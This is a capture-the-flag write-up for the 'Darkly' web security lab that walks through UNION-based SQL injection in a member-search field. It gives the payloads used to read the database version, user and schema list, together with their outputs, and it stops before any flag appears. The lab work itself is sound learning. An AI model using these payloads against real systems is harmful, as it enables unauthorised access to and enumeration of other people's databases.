# Darkly

## Sql Injection

### Flag

### How to find it

- On the Members section, there is a field in order to search for a member giving the id. This fields is directly vulnerable to a sql injection. We can try a UNION Based sql insection in order to get information about the webserver, for example if we type: 

`1 union select 1,version()`
    
    We can get information about the host: 
    
    `5.5.64-MariaDB-1ubuntu0.14.04.1`
    If we want information about the database that it is using we should type:
    
    `1 union select database(),user()` 
    
    Output:
    `Member_Sql_Injection`
    
    Knowing that this field is vulnerable to sql injection we can get all the databases inside this webserver using: 
    
    `1 union select schema_name, 2 from information_schema.schemata`
    
    This will give us:
    
    - information_schema
    - Member_Brute_Force
    - Member_Sql_Injection
    - Member_guestbook
    - Member_images
    - Member_survey